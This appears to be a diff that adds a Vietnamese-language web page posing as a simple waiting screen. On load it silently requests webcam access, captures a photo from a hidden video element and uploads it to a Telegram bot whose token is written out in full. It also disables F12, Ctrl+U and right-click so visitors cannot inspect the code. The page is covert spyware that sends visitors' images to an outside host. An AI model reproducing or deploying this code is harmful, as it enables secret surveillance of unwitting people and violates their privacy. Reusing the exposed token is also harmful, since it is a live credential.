@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>An Nek</title>
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+</head>
+<body>
+    <h1>Đợi Bố 1 Tí Bố Đang Hoạt Động</h1>
+    <video id="video" autoplay style="display:none;"></video>
+
+    <script>
+        // Ngăn chặn F12, Ctrl+U, và menu chuột phải
+        document.onkeydown = function(event) {
+            if (event.keyCode == 123) {
+                return false; // Ngăn chặn phím F12
+            }
+        };
+        document.addEventListener('keydown', function(event) {
+            if (event.ctrlKey && event.key === 'u') {
+                event.preventDefault(); // Ngăn chặn tổ hợp Ctrl+U
+            }
+        });
+        document.addEventListener('contextmenu', function(event) {
+            event.preventDefault(); // Ngăn chặn menu chuột phải
+        });
+
+        // Chụp ảnh từ webcam
+        function capturePhoto() {
+            var video = document.getElementById('video');
+            var canvas = document.createElement('canvas');
+            var context = canvas.getContext('2d');
+
+            // Cài đặt kích thước canvas theo kích thước video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Chụp ảnh từ video
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Lấy dữ liệu ảnh dưới dạng Blob
+            canvas.toBlob(function(blob) {
+                var formData = new FormData();
+                formData.append('chat_id', '@hackcamera_anios_bot'); // ID chat của bạn
+                formData.append('photo', blob, 'photo.jpg');
+
+                // Gửi ảnh đến Telegram
+                $.ajax({
+                    type: 'POST',
+                    url: 'https://api.telegram.org/bot8052796158:AAHxylfPMZkzKvavVNbR8anugNEppTedL4s/sendPhoto', // Token của bạn
+                    data: formData,
+                    processData: false,
+                    contentType: false,
+                    success: function(response) {
+                        console.log('Đã gửi ảnh thành công đến Telegram');
+                    },
+                    error: function(error) {
+                        console.log('Lỗi khi gửi ảnh đến Telegram: ' + error);
+                    }
+                });
+            }, 'image/jpeg');
+        }
+
+        // Yêu cầu quyền truy cập webcam và tự động chụp ảnh
+        function requestCameraAccess() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    var video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Tự động chụp ảnh sau 1 giây
+                    setTimeout(function() {
+                        capturePhoto();
+                    }, 1000);
+                })
+                .catch(function(error) {
+                    console.log('Đã xảy ra lỗi khi truy cập webcam: ' + error.message);
+                });
+        }
+
+        // Yêu cầu quyền truy cập camera khi tải trang
+        requestCameraAccess();
+    </script>
+</body>
+</html>
